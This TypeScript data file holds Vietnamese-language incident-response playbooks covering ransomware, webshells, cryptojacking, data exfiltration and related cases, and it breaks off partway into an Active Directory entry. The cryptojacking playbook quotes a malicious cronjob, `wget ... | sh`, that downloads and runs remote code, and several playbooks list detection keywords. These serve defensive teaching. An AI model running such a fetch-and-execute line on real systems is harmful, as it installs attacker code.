interface PlaybookStep {
  title: string
  content: string
  icon?: string
}

interface PlaybookReference {
  title: string
  url: string
}

export interface Playbook {
  id: string
  title: string
  description: string
  type: string
  platforms: string[]
  mitre: string
  color: string
  icon: string
  goals: string[]
  steps: PlaybookStep[]
  references: PlaybookReference[]
}

export const PLAYBOOKS: Playbook[] = [
  {
    id: 'ransomware',
    title: 'Ransomware Response & Recovery',
    description: 'Quy trình chuẩn ứng phó khẩn cấp với sự cố mã độc tống tiền (Ransomware). Kịch bản này hướng dẫn chi tiết từ bước cô lập hệ thống, phân tích tĩnh/động để tìm công cụ giải mã, cho tới việc khôi phục và đánh giá rủi ro hậu sự cố.',
    type: 'Malware Response',
    platforms: ['Windows', 'Linux', 'ESXi'],
    mitre: 'T1486 (Data Encrypted for Impact)',
    color: 'rose',
    icon: 'ShieldAlert',
    goals: [
      'Visibility: Xác định chính xác "bán kính vụ nổ" (blast radius) của Ransomware trên toàn mạng.',
      'Containment: Cô lập khẩn cấp các máy chủ/phân vùng chưa bị lây nhiễm, ngăn chặn hành vi Lateral Movement.',
      'Identification: Thu thập mẫu mã độc (Sample) và Ransom Note để định danh chủng loại (e.g. LockBit, BlackBasta) và tìm Decryptor.',
      'Evidence Collection: Dump RAM khẩn cấp để trích xuất khóa giải mã (nếu còn) và thu thập Windows Event Logs (4624, 4625).',
      'Recovery & Remediation: Đảm bảo môi trường sạch sẽ (Eradication) trước khi khôi phục dữ liệu từ bản sao lưu (Backup) offline.'
    ],
    steps: [
      {
        title: 'Bước 1: Cô lập & Bảo toàn Hiện trường (Containment)',
        content: '**Hành động ngay lập tức:**\n- **Ngắt mạng vật lý/logic:** Rút dây mạng, disable NIC trên vCenter/Hyper-V, hoặc chuyển máy vào VLAN cô lập (Quarantine VLAN).\n- **KHÔNG TẮT NGUỒN:** Việc khởi động lại máy có thể xóa mất khóa giải mã trên RAM hoặc kích hoạt các đoạn mã phá hủy dữ liệu (Wiper) của hacker.\n- **Khóa tài khoản:** Tạm khóa toàn bộ tài khoản Admin, Service Accounts nghi ngờ bị lộ lọt (Compromised). Tắt giao thức RDP (Port 3389) và SMB (Port 445) trên các segment mạng liên quan.',
        icon: 'Lock'
      },
      {
        title: 'Bước 2: Phân loại & Thu thập Thông tin Nhanh (Triage)',
        content: '**Thu thập các chỉ dấu (IOCs):**\n- Chụp ảnh màn hình (Screenshot) thông điệp đòi tiền chuộc (Ransom Note).\n- Tìm file bị mã hóa gần nhất để xác định phần mở rộng (Extension) (VD: .locked, .enc).\n- Upload một file nhỏ đã bị mã hóa và Ransom Note lên [ID Ransomware](https://id-ransomware.malwarehunterteam.com/) để nhận diện dòng mã độc.\n- Ghi nhận các tiến trình (Processes) đang tiêu tốn I/O Disk hoặc CPU cao bất thường (có thể quá trình mã hóa vẫn đang diễn ra).',
        icon: 'Search'
      },
      {
        title: 'Bước 3: Memory Dump & Triage Collection',
        content: '**Bảo tồn chứng cứ dễ bay hơi (Volatile Data):**\n- Sử dụng công cụ **WinPmem** hoặc **DumpIt** để sao chụp toàn bộ bộ nhớ RAM vào một ổ đĩa USB cắm ngoài. (RAM có thể chứa Key giải mã dạng plaintext).\n- Thực thi **Evidence Collection Checklist (Phase 1)** để tự động xuất danh sách: Network Connections, Running Processes, Autoruns, và DNS Cache.\n- Chạy **KAPE (Kroll Artifact Parser and Extractor)** để thu thập nhanh Registry Hives, MFT, và Event Logs.',
        icon: 'Cpu'
      },
      {
        title: 'Bước 4: Điều tra Nguyên nhân Gốc (Root Cause Analysis)',
        content: '**Tìm điểm xâm nhập (Initial Access):**\n- Phân tích Firewall/VPN Logs để tìm hành vi Brute-force hoặc lỗ hổng chưa vá (VD: FortiGate, Pulse Secure).\n- Phân tích Email Gateway Logs tìm các chiến dịch Phishing có chứa payload.\n- Phân tích **Security.evtx** (Event ID 4624, 4625) để xem hacker đã dùng tài khoản nào đăng nhập và từ IP nào.\n- Kiểm tra các công cụ RMM (AnyDesk, TeamViewer) bị cài đặt lén lút (Shadow IT).',
        icon: 'Target'
      },
      {
        title: 'Bước 5: Báo cáo & Lên kế hoạch Khắc phục',
        content: '**Cấu trúc Báo cáo Cần Có:**\n- **Executive Summary:** Đánh giá thiệt hại kinh doanh và trạng thái hiện tại.\n- **Timeline Sự kiện:** Từ lúc xâm nhập đầu tiên đến lúc kích hoạt mã hóa.\n- **IOCs (Indicators of Compromise):** Danh sách IP, Domain C2, File Hashes.\n- **Hành động Khắc phục:** Xóa sạch hệ thống, cài lại OS mới hoàn toàn, patch lỗ hổng, kích hoạt EDR/MDR trước khi đưa vào hoạt động.',
        icon: 'FileText'
      }
    ],
    references: [
      { title: 'CISA: Kế hoạch Ứng phó Ransomware', url: 'https://www.cisa.gov/stopransomware/ransomware-guide' },
      { title: 'Dự án No More Ransom (Công cụ Giải mã Miễn phí)', url: 'https://www.nomoreransom.org/' },
      { title: 'NIST SP 1800-26: Quản lý Rủi ro Ransomware', url: 'https://csrc.nist.gov/publications/detail/sp/1800-26/final' }
    ]
  },
  {
    id: 'webshell',
    title: 'Webshell & Backdoor Hunting',
    description: 'Quy trình chuyên sâu về săn lùng và phân tích mã độc ẩn náu trên máy chủ Web (IIS, Nginx, Apache). Kịch bản này giúp phát hiện các đoạn mã thực thi trái phép (Webshell) lợi dụng lỗ hổng ứng dụng (File Upload, RCE).',
    type: 'Threat Hunting',
    platforms: ['Windows', 'Linux'],
    mitre: 'T1505.003 (Web Shell)',
    color: 'emerald',
    icon: 'TerminalSquare',
    goals: [
      'Visibility: Giám sát toàn bộ lưu lượng web và các tập tin được tạo ra trên thư mục Web Root.',
      'Detection: Phát hiện mã độc PHP/JSP/ASPX lẩn trốn dưới các đuôi file ảnh (.jpg, .png) hoặc bị mã hóa rườm rà (Obfuscation).',
      'Analysis: Phân tích Web Access Logs để tìm ra IP của kẻ tấn công và thời điểm khai thác (Exploit).',
      'Eradication: Loại bỏ tận gốc Webshell và các cửa hậu (Backdoor) liên quan trong hệ điều hành.',
      'Prevention: Đề xuất các bản vá cho mã nguồn ứng dụng Web và cấu hình WAF (Web Application Firewall).'
    ],
    steps: [
      {
        title: 'Bước 1: Quét tệp hệ thống Web Root (File System Scan)',
        content: '**Xác định các tệp tin bất thường:**\n- Sử dụng công cụ YARA hoặc Thor Scanner để quét các thư mục chứa mã nguồn (VD: `C:\\inetpub\\wwwroot` hoặc `/var/www/html`).\n- Tìm các tệp tin `.php`, `.aspx`, `.jsp` được sửa đổi (Modified) trong khoảng thời gian xảy ra sự cố.\n- Lệnh kiểm tra Linux: `find /var/www -name "*.php" -mtime -7` (Tìm file PHP sửa đổi 7 ngày qua).\n- Tìm kiếm các hàm thực thi lệnh ẩn giấu: `eval()`, `base64_decode()`, `system()`, `shell_exec()`.',
        icon: 'Scan'
      },
      {
        title: 'Bước 2: Phân tích Web Access & Error Logs',
        content: '**Săn lùng dấu vết trong Logs:**\n- Thu thập toàn bộ Access Logs của Apache/Nginx hoặc IIS Logs.\n- Tìm kiếm các HTTP POST requests với tần suất thấp (Low Frequency) tới các file cụ thể.\n- Tìm các yêu cầu trả về mã trạng thái HTTP 200 từ các URL đáng ngờ hoặc các tệp tin nằm sâu trong thư mục tải lên (`/uploads/`, `/images/`).\n- Kiểm tra các tham số User-Agent lạ hoặc các chuỗi tấn công (SQLi, Path Traversal) trong URI.',
        icon: 'FileText'
      },
      {
        title: 'Bước 3: Phân tích Tiến trình Con (Child Processes Anomaly)',
        content: '**Kiểm tra hành vi của Web Server:**\n- Thông thường các tiến trình web server (`w3wp.exe`, `nginx`, `httpd`, `tomcat`) chỉ xử lý logic web.\n- Nếu phát hiện các tiến trình này sinh ra (spawn) các tiến trình shell hệ thống như `cmd.exe`, `powershell.exe`, `bash`, hoặc `sh` -> **ĐÂY LÀ DẤU HIỆU CỦA WEBSHELL / RCE.**\n- Kiểm tra công cụ Netstat/SS để xem web server có đang tạo các kết nối Reverse Shell ra ngoài Internet qua các port lạ (e.g. 4444, 8080) hay không.',
        icon: 'Activity'
      },
      {
        title: 'Bước 4: Loại bỏ và Ngăn chặn (Remediation)',
        content: '**Vá lỗ hổng và khôi phục:**\n- Xóa bỏ tập tin Webshell hoặc khôi phục mã nguồn từ kho lưu trữ (Git/SVN) sạch.\n- Đánh giá mã nguồn (Source Code Review) để tìm và vá lỗi Unrestricted File Upload.\n- Cấu hình phân quyền thư mục (Permissions): Ngăn chặn thư mục `/uploads/` được quyền thực thi script (Disable execution).\n- Bật các rules bảo vệ trên thiết bị WAF/IPS.',
        icon: 'Target'
      }
    ],
    references: [
      { title: 'NSA & CISA: Phát hiện và Giảm thiểu Web Shells', url: 'https://www.nsa.gov/Portals/70/documents/what-we-do/cybersecurity/professional-resources/csi-web-shells.pdf' },
      { title: 'MITRE ATT&CK: Web Shell (T1505.003)', url: 'https://attack.mitre.org/techniques/T1505/003/' },
      { title: 'OWASP File Upload Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html' }
    ]
  },
  {
    id: 'generic-dfir',
    title: 'Generic DFIR Workflow',
    description: 'Quy trình thu thập và phản ứng chung, toàn diện cho mọi sự kiện an ninh mạng (Malware, Data Breach, Insider Threat). Áp dụng khi chưa phân loại được cụ thể nguyên nhân sự cố.',
    type: 'Incident Response',
    platforms: ['Windows', 'Linux', 'macOS'],
    mitre: 'Multiple Tactics',
    color: 'blue',
    icon: 'Briefcase',
    goals: [
      'Triage & Scope: Đánh giá nhanh mức độ nghiêm trọng và khoanh vùng các hệ thống bị ảnh hưởng.',
      'Volatile Data Preservation: Thu thập khẩn cấp dữ liệu biến động trên RAM, cache trước khi tắt máy.',
      'Chain of Custody: Đảm bảo tính toàn vẹn của bằng chứng pháp y để phục vụ mục đích kiện tụng nếu cần.',
      'Forensic Imaging: Tạo bản sao vật lý bit-by-bit để phân tích chuyên sâu ngoại tuyến (Offline Analysis).'
    ],
    steps: [
      {
        title: 'Bước 1: Chẩn đoán & Secure the Scene',
        content: '**Bảo vệ hiện trường:**\n- Hạn chế quyền truy cập vật lý và logic vào thiết bị/máy chủ bị nghi ngờ xâm nhập.\n- Nếu là máy ảo (VM), hãy ngay lập tức tạo Snapshot có bao gồm cả tùy chọn Memory.\n- Không tắt nóng hệ thống (trừ khi hệ thống đang xóa dữ liệu ồ ạt) để tránh mất dấu vết lưu trên RAM.\n- Ghi lại thông tin người phát hiện, thời điểm phát hiện và triệu chứng ban đầu.',
        icon: 'Lock'
      },
      {
        title: 'Bước 2: Thu thập Dữ liệu Trực tiếp (Live Response Data)',
        content: '**Sử dụng Checklist Tự động:**\n- Khởi chạy DFIR Collection Checklist trên nền tảng (Phase 1) để trích xuất:\n  + Các tiến trình đang chạy (Processes) và thư viện DLL được nạp.\n  + Kết nối mạng mở, bảng định tuyến (Routing), ARP cache.\n  + Danh sách Users đang đăng nhập, nhóm quyền cục bộ.\n  + Autoruns, Scheduled Tasks, và Services đang chạy.\n- Xuất kết quả ra file txt/csv có mã băm (Hash) để chứng minh tính nguyên bản.',
        icon: 'Download'
      },
      {
        title: 'Bước 3: Disk & Memory Imaging',
        content: '**Lấy bản sao pháp y vật lý:**\n- **RAM:** Sử dụng DumpIt / FTK Imager / winpmem / LiME (Linux) để lấy ảnh bộ nhớ.\n- **Đĩa cứng:** Sử dụng thiết bị chặn ghi (Write-Blocker) nếu lấy ổ đĩa vật lý.\n- Sử dụng phần mềm FTK Imager / Guymager để xuất file ảnh đĩa theo định dạng E01 hoặc DD/RAW.\n- **Bắt buộc:** Phải tính toán mã băm MD5 và SHA-256 cho file Image ngay sau khi tạo xong.',
        icon: 'HardDrive'
      },
      {
        title: 'Bước 4: Phân tích Ngoại tuyến (Offline Analysis)',
        content: '**Điều tra bằng công cụ chuyên dụng:**\n- Mount file ảnh đĩa vào các công cụ phân tích (Autopsy, X-Ways, Axiom).\n- Thu thập MFT (Master File Table) để phân tích Timeline và phục hồi file đã bị xóa.\n- Phân tích Registry Hives (SAM, SYSTEM, SOFTWARE) để tìm kiếm bằng chứng thực thi (Shimcache, Amcache) và USB ngoại vi.\n- Tổng hợp Timeline để vẽ nên toàn bộ quá trình xâm nhập của kẻ tấn công.',
        icon: 'Activity'
      }
    ],
    references: [
      { title: 'SANS: Quy trình Ứng phó Sự cố (PICERL)', url: 'https://www.sans.org/white-papers/33901/' },
      { title: 'RFC 3227: Hướng dẫn Thu thập Bằng chứng', url: 'https://datatracker.ietf.org/doc/html/rfc3227' },
      { title: 'NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide', url: 'https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final' }
    ]
  },
  {
    id: 'compliance',
    title: 'Compliance & Security Audit',
    description: 'Quy trình rà quét, kiểm tra sự tuân thủ bảo mật theo các khung tiêu chuẩn quốc tế (ISO 27001, SOC 2, PCI-DSS, NIST). Trọng tâm của quá trình này là Đánh giá Gap (Gap Detection) và Sẵn sàng cho quá trình Audit thực tế.',
    type: 'Security Audit',
    platforms: ['Windows', 'Linux', 'Cloud'],
    mitre: 'Compliance Controls',
    color: 'emerald',
    icon: 'ShieldAlert',
    goals: [
      'Visibility: Biết chính xác ai đang làm gì, có quyền gì trên từng hệ thống cụ thể.',
      'Gap Detection: Tìm khoảng cách giữa chính sách bảo mật (Policy) và thực tế triển khai dưới hạ tầng.',
      'Threat Exposure: Phát hiện sớm các cấu hình sai lệch rủi ro cao trước khi bị tin tặc khai thác (VD: port mở public, mật khẩu yếu).',
      'Regulatory Readiness: Sẵn sàng hồ sơ, bằng chứng (Audit Trail) để đối mặt với các đợt kiểm tra đánh giá chứng nhận quốc tế.'
    ],
    steps: [
      {
        title: 'Bước 1: Rà soát Quản lý Định danh & Truy cập (IAM)',
        content: '**Kiểm tra các rủi ro về Tài khoản:**\n- Lọc danh sách các tài khoản nhân viên không đăng nhập quá 90 ngày (Stale Accounts).\n- Soát xét lại quyền Admin: Các tài khoản Service hoặc User có bị gán quyền Admin cục bộ quá mức cần thiết (Over-privileged) không.\n- Kiểm tra xem MFA (Xác thực 2 bước) đã được bắt buộc áp dụng cho toàn bộ VPN và Cloud Services chưa.\n- Chính sách quay vòng mật khẩu (Password Rotation) và thời hạn phiên làm việc (Session Expiry).',
        icon: 'Lock'
      },
      {
        title: 'Bước 2: Rà soát Mạng & Hạ tầng (Network & Infrastructure)',
        content: '**Kiểm tra phân vùng mạng và kết nối:**\n- Quét các cổng mạng mở nguy hiểm (22 SSH, 3389 RDP, 445 SMB) ra ngoài Internet.\n- Đánh giá luật tường lửa (Firewall Rules): Loại bỏ các rule lỗi thời hoặc có thiết lập rủi ro "Allow All".\n- Xác minh việc truyền tải dữ liệu nội bộ được mã hóa an toàn (Sử dụng HTTPS/TLS thay vì HTTP/Telnet).\n- Rà soát các thiết bị không xác định (Rogue devices) và các thiết bị ngoại vi không đăng ký.',
        icon: 'Target'
      },
      {
        title: 'Bước 3: Rà soát Endpoint & Quản lý Dữ liệu Nhạy cảm (Data & Secrets)',
        content: '**Kiểm tra máy trạm, máy chủ và Kho dữ liệu:**\n- Patch Level: Xác minh hệ điều hành và phần mềm bên thứ 3 đã được vá các CVE điểm CVSS cao chưa.\n- AV/EDR Coverage: Đảm bảo 100% các máy có cài đặt và chạy ngầm Agent phòng chống mã độc.\n- Quét rò rỉ dữ liệu (Secrets Scanning): Tìm kiếm các Hardcoded API Keys, mật khẩu trong Source Code (Git) hoặc Config files.\n- Dữ liệu PII/PCI: Xác minh dữ liệu nhạy cảm của khách hàng đang được mã hóa ở trạng thái nghỉ (Data at Rest).',
        icon: 'Search'
      },
      {
        title: 'Bước 4: Rà soát Logs, Monitoring & Change Management',
        content: '**Bảo đảm khả năng giám sát và kiểm soát thay đổi:**\n- Kiểm tra thời gian lưu trữ Log: Event Logs và System Logs có được giữ tối thiểu 90 ngày (hoặc 1 năm theo PCI-DSS) không.\n- Xác minh tính đầy đủ của Audit Logs: Liệu các hành vi tạo user mới, cấp quyền admin có sinh ra cảnh báo trên SIEM không.\n- Quản lý Thay đổi (Change Management): Việc triển khai cấu hình mới lên Production có record phê duyệt (Approval) trên hệ thống Jira/Ticketing không.',
        icon: 'FileText'
      },
      {
        title: 'Bước 5: Lập báo cáo Gap Analysis & Remediation',
        content: '**Xuất báo cáo cho các bên liên quan:**\n- **Executive Summary:** Tổng quan điểm Compliance Score và Top 5 rủi ro nghiêm trọng (dành cho Ban Giám đốc).\n- **Technical Findings:** Mô tả chi tiết từng lỗ hổng, mức độ rủi ro, kèm theo ID của Framework (VD: NIST SP 800-53 AC-2).\n- **Remediation Roadmap:** Bảng lộ trình khắc phục với Deadline rõ ràng (VD: Critical fix trong 24h, High trong 7 ngày) và Gán đúng Owner chịu trách nhiệm.',
        icon: 'Activity'
      }
    ],
    references: [
      { title: 'ISO/IEC 27001:2022 Standard', url: 'https://www.iso.org/isoiec-27001-information-security.html' },
      { title: 'NIST Cybersecurity Framework 2.0', url: 'https://www.nist.gov/cyberframework' },
      { title: 'PCI Security Standards', url: 'https://www.pcisecuritystandards.org/' },
      { title: 'CIS Controls v8', url: 'https://www.cisecurity.org/controls/v8' }
    ]
  },
  {
    id: 'security-hunting',
    title: 'Security Assessment & Hunting',
    description: 'Quy trình chủ động thu thập bằng chứng và săn tìm dấu hiệu xâm nhập (Threat Hunting) trên Windows và Linux. Áp dụng để rà soát an toàn định kỳ hoặc xác minh một nghi ngờ chưa rõ — thu thập snapshot toàn diện về tiến trình, mạng, tài khoản, persistence và log.',
    type: 'Threat Hunting',
    platforms: ['Windows', 'Linux'],
    mitre: 'Multiple Tactics (Discovery, Persistence, C2)',
    color: 'blue',
    icon: 'Crosshair',
    goals: [
      'Visibility: Ảnh chụp toàn diện trạng thái hệ thống (process, mạng, account, persistence).',
      'Detection: Phát hiện tiến trình lạ, kết nối C2 (Beaconing), tài khoản trái phép, backdoor.',
      'Evidence Collection: Thu thập bằng chứng có mốc thời gian để dựng Timeline tấn công.',
      'Threat Hunting: Trích xuất IOC để săn tìm trên diện rộng (SIEM/ELK).'
    ],
    steps: [
      {
        title: 'Bước 1: Chuẩn bị & Khoanh vùng (Scope)',
        content: '**Xác định phạm vi và mục tiêu:**\n- Tạo một Case mới trong Case Manager để gom toàn bộ bằng chứng.\n- Xác định danh sách máy cần rà soát (scope) và gán Agent tương ứng.\n- Mở **Evidence & Compliance** với profile **Forensic Collection** — bộ check đã có sẵn note "Phục vụ" và gợi ý tool cho từng mục.',
        icon: 'Target'
      },
      {
        title: 'Bước 2: Thu thập trên Windows',
        content: '**5 nhóm bằng chứng:**\n- **System & Patches:** `systeminfo`, `Get-HotFix` — đối chiếu CVE để tìm máy thiếu bản vá.\n- **Identity:** `net user`, `net localgroup administrators`, `query user` — tìm account lạ / admin trái phép.\n- **Process & Network:** `Get-Process` (lọc Path) + `Get-NetTCPConnection` map process — soi process không path, parent bất thường, beaconing.\n- **Persistence:** `schtasks`, Registry Run keys (HKLM/HKCU), scheduled tasks non-Microsoft.\n- **Event hunt:** ID 4624/4625 (logon), 4697 (cài service = backdoor), 4104 (PowerShell script đáng ngờ).',
        icon: 'Server'
      },
      {
        title: 'Bước 3: Thu thập trên Linux',
        content: '**5 nhóm bằng chứng:**\n- **System:** `uname -a`, firewall (`iptables`/`ufw`), `sshd_config` (PermitRootLogin/PasswordAuthentication = cấu hình lỏng).\n- **Identity:** `/etc/passwd` (shell), nhóm sudo/wheel, `last`/`lastb` — bùng nổ failed login = brute-force.\n- **Process & Network:** `ps auxef`/`pstree`, `ss -antup` — phát hiện reverse shell.\n- **Persistence:** crontab, systemd enabled, `authorized_keys` lạ, LD_PRELOAD, SUID/SGID bất thường.\n- **Logs:** `auth.log`/`secure`, bash_history.',
        icon: 'TerminalSquare'
      },
      {
        title: 'Bước 4: Phân tích & Dựng Timeline',
        content: '**Biến bằng chứng thành kết luận:**\n- Dùng **AI Analysis** để tóm tắt phát hiện và đánh giá bất thường từ output đã thu.\n- Đưa IOC (IP, hash, path) vào **ELK Threat Hunting** để săn trên diện rộng.\n- Promote hits + **AI Extract/Rebuild** vào **Attack Timeline** của case để dựng dòng sự kiện chuẩn.\n- Khi xác định loại tấn công cụ thể → chuyển sang playbook chuyên sâu (Webshell/Ransomware).',
        icon: 'Activity'
      },
      {
        title: 'Bước 5: Tự động hóa & Quy mô lớn',
        content: '**Khi cần rà soát hàng trăm máy:**\n- **KAPE / CyLR** (Windows) và **UAC** (Linux): tự động đóng gói artifact của từng máy.\n- **Hayabusa / DeepBlueCLI / Chainsaw:** phân tích nhanh Windows Event Logs tìm dấu hiệu tấn công.\n- **Velociraptor (khuyên dùng):** triển khai agent đa nền tảng, viết truy vấn VQL để hunt & thu thập bằng chứng từ hàng ngàn máy qua web console tập trung.\n- **OSQuery / Wazuh:** truy vấn trạng thái endpoint dạng SQL trên toàn fleet.',
        icon: 'Download'
      }
    ],
    references: [
      { title: 'MITRE ATT&CK Framework', url: 'https://attack.mitre.org/' },
      { title: 'Velociraptor — Digital Forensic & Incident Response', url: 'https://docs.velociraptor.app/' },
      { title: 'SANS Threat Hunting Resources', url: 'https://www.sans.org/blog/threat-hunting-resources/' }
    ]
  },
  {
    id: 'cryptojacking',
    title: 'Cryptojacking & Resource Hijacking',
    description: 'Quy trình xử lý sự cố máy chủ hoặc máy trạm bị nhiễm mã độc đào tiền ảo. Kịch bản này tập trung vào việc phát hiện nhanh các tiến trình lạm dụng CPU, cắt đứt kết nối mạng đến các mining pools, và gỡ bỏ các đoạn script duy trì.',
    type: 'Malware Response',
    platforms: ['Windows', 'Linux', 'Cloud'],
    mitre: 'T1496 (Resource Hijacking)',
    color: 'orange',
    icon: 'Cpu',
    goals: [
      'Visibility: Giám sát tài nguyên CPU/GPU và nhận diện tiến trình lạ không rõ nguồn gốc (XMRig, kdevtmpfsi).',
      'Containment: Chặn lưu lượng truy cập mạng ra các địa chỉ IP và tên miền liên quan đến Mining Pools (TCP 3333, 4444, v.v.).',
      'Eradication: Vô hiệu hóa tiến trình và xóa bỏ các tác vụ lập lịch (cron, Scheduled Tasks) dùng để tự động tải mã độc xuống.',
      'Root Cause: Đánh giá lỗ hổng hệ thống ban đầu (VD: Cấu hình Redis/Docker API không an toàn, hoặc mật khẩu SSH yếu).'
    ],
    steps: [
      {
        title: 'Bước 1: Giám sát Hệ thống & Triage',
        content: '**Xác định dấu hiệu bất thường:**\n- Kiểm tra các biểu đồ theo dõi hiệu năng (Grafana/Zabbix) xem CPU có duy trì mức 100% trong thời gian dài hay không.\n- Chạy các lệnh kiểm tra trạng thái quy trình (`top`, `htop`, `Get-Process`) trên máy bị nghi ngờ để tìm xem quy trình nào đang tiêu tốn nhiều tài nguyên nhất.\n- Chú ý các tiến trình có tên là các chuỗi ngẫu nhiên hoặc ẩn trong thư mục `/tmp/`, `/dev/shm/`, hoặc thư mục Temp của người dùng.',
        icon: 'Activity'
      },
      {
        title: 'Bước 2: Phân tích Mạng (Network Analysis)',
        content: '**Xác định kết nối đào tiền ảo:**\n- Kiểm tra danh sách các kết nối hiện hành (`netstat -antp` hoặc `Get-NetTCPConnection`).\n- Tìm các phiên kết nối dài hạn tới các cổng mạng không tiêu chuẩn nhưng phổ biến của mining pools như 3333, 4444, 5555, 8080.\n- Phân tích DNS queries tìm các tên miền chứa từ khóa "pool", "miner", "xmr", "monero".',
        icon: 'Network'
      },
      {
        title: 'Bước 3: Vô hiệu hóa Tiến trình & Xóa Persistence',
        content: '**Làm sạch hệ thống (Eradication):**\n- Ngừng cưỡng bức (Kill) các tiến trình nghi ngờ. Tuy nhiên, mã độc đào tiền ảo thường có cơ chế watchdog (tiến trình tự hồi sinh) nên cần kill cả tiến trình mẹ/con.\n- Kiểm tra toàn diện hệ thống lập lịch: Lệnh `crontab -l`, `cat /etc/crontab` trên Linux; và `schtasks` trên Windows.\n- Loại bỏ các cronjob đáng ngờ (ví dụ: `* * * * * wget -q -O - http://pastebin.com/xxx | sh`).\n- Rà soát các mục Autorun và WMI event subscriptions.',
        icon: 'Target'
      },
      {
        title: 'Bước 4: Điều tra Nguyên nhân & Khắc phục',
        content: '**Phòng ngừa tái diễn:**\n- Kiểm tra các dịch vụ đang mở ra Internet (Redis 6379, Docker 2375, SSH 22). Hacker thường quét các dịch vụ không xác thực.\n- Phân tích `auth.log` và `secure` log để xem có dấu hiệu brute-force SSH hay không.\n- Cập nhật phiên bản phần mềm (Patching) và áp dụng cấu hình bảo mật cứng (Hardening) như tắt Password Authentication cho SSH, thay bằng Public Key.',
        icon: 'ShieldCheck'
      }
    ],
    references: [
      { title: 'MITRE ATT&CK: Resource Hijacking (T1496)', url: 'https://attack.mitre.org/techniques/T1496/' },
      { title: 'CISA: Defending Against Cryptojacking', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-296a' }
    ]
  },
  {
    id: 'data-exfiltration',
    title: 'Data Exfiltration & Insider Threat',
    description: 'Quy trình điều tra việc truy cập và tuồn dữ liệu nhạy cảm ra ngoài trái phép, do nhân viên nội bộ (Insider) hoặc hacker thực hiện thông qua các công cụ lưu trữ đám mây, email, hoặc ổ cứng gắn ngoài.',
    type: 'Incident Response',
    platforms: ['Windows', 'Linux', 'macOS'],
    mitre: 'T1048 (Exfiltration Over Alternative Protocol)',
    color: 'pink',
    icon: 'Database',
    goals: [
      'Detection: Xác định các công cụ lưu trữ hoặc giao thức lạ được sử dụng để chuyển đổi lượng lớn dữ liệu.',
      'Tracing: Truy tìm các thư mục Staging, nơi kẻ gian gom dữ liệu và nén lại (.zip, .7z) trước khi tải lên.',
      'Evidence: Thu thập dấu vết hoạt động của USB, logs truy cập mạng và các hành vi truy xuất tập tin nhạy cảm.',
      'Containment: Thu hồi đặc quyền truy cập (Access Revocation) và chặn các cổng truyền dữ liệu ra Internet.'
    ],
    steps: [
      {
        title: 'Bước 1: Rà soát Thư mục Staging',
        content: '**Tìm nơi gom dữ liệu (Data Staging):**\n- Hacker hoặc Insider ít khi tải từng tệp một. Họ thường gom tất cả vào một thư mục tạm rồi nén lại.\n- Truy tìm các file nén (`.zip`, `.rar`, `.tar.gz`) có dung lượng lớn bất thường xuất hiện ở các thư mục như `%TEMP%`, `C:\\Users\\Public`, `/tmp/`, `/dev/shm/`.\n- Kiểm tra lịch sử thực thi lệnh (Bash history) hoặc các bản ghi Prefetch/Amcache xem có sử dụng các công cụ `7z.exe`, `WinRAR.exe`, `tar` không.',
        icon: 'Folder'
      },
      {
        title: 'Bước 2: Kiểm tra Lịch sử Thiết bị Ngoại vi (USB)',
        content: '**Xác minh khả năng trích xuất vật lý:**\n- Trích xuất dữ liệu từ Windows Registry (`HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR`) để lấy danh sách tất cả các USB từng cắm vào thiết bị.\n- Truy vết thời gian cắm vào/rút ra (Plug/Unplug events) thông qua Event Logs (Event ID 2003, 10000).\n- Liên kết thời gian cắm USB với các sự kiện truy xuất file (File Access).',
        icon: 'HardDrive'
      },
      {
        title: 'Bước 3: Phân tích Lưu lượng Mạng (Network Data Transfer)',
        content: '**Phát hiện điểm đến của dữ liệu:**\n- Xem lại logs của Proxy Server, Firewall hoặc NetFlow để tìm các kết nối outbound tiêu thụ lượng băng thông bất thường (đặc biệt theo chiều Upload).\n- Săn lùng các tên miền của các dịch vụ chia sẻ file như Mega, Dropbox, Google Drive, WeTransfer trên các thiết bị không có chính sách cho phép dùng.\n- Phát hiện sự hiện diện của các công cụ dòng lệnh truyền dữ liệu như `curl`, `rclone`, `scp`, `ftp`.',
        icon: 'Globe'
      },
      {
        title: 'Bước 4: Xác định Phạm vi Thiệt hại (Impact Assessment)',
        content: '**Đánh giá dữ liệu bị mất:**\n- Nếu hệ thống có bật tính năng File Audit (Event ID 4663) hoặc có hệ thống DLP, trích xuất danh sách các tệp tin nhạy cảm (PII, mã nguồn, kế hoạch tài chính) đã bị truy cập bởi người dùng nghi ngờ.\n- Đưa ra báo cáo thống kê chính xác lượng dữ liệu đã bị tuồn ra ngoài, loại dữ liệu gì và thời gian diễn ra để thông báo cho pháp chế (Legal) hoặc khách hàng.',
        icon: 'FileWarning'
      }
    ],
    references: [
      { title: 'MITRE ATT&CK: Exfiltration (TA0010)', url: 'https://attack.mitre.org/tactics/TA0010/' },
      { title: 'CISA: Insider Threat Mitigation', url: 'https://www.cisa.gov/insider-threat-mitigation' }
    ]
  },
  {
    id: 'ad-lateral-movement',
    title: 'Active Directory & Lateral Movement',
    description: 'Quy trình săn lùng nâng cao trong môi trường Active Directory (AD). Tập trung vào việc phát hiện kẻ tấn công sau khi chiếm một thiết bị, trích xuất thông tin đăng nhập (Credential Dumping) và dùng nó để di chuyển tới các máy chủ quan trọng khác (Lateral Movement).',
    type: 'Threat Hunting',
    platforms: ['Windows', 'Active Directory'],
    mitre: 'T1003 (Credential Dumping) & T1021 (Remote Services)',
    color: 'indigo',
    icon: 'Network',
    goals: [
      'Visibility: Thu thập toàn diện Event Logs liên quan đến tiến trình đăng nhập mạng và xác thực tài khoản.',
      'Credential Discovery: Phát hiện dấu vết trích xuất mật khẩu từ bộ nhớ của tiến trình lsass.exe.',
      'Movement Tracking: Nhận diện việc lạm dụng các dịch vụ điều khiển từ xa (PsExec, WMI, WinRM, RDP) để thực thi mã độc trên máy tính khác.',
      'Containment: Đóng băng các tài khoản bị xâm phạm và reset mật khẩu khẩn cấp (KRBTGT) nếu có dấu hiệu Golden Ticket.'
    ],
    steps: [
      {
        title: 'Bước 1: Săn tìm Credential Dumping (LSASS)',
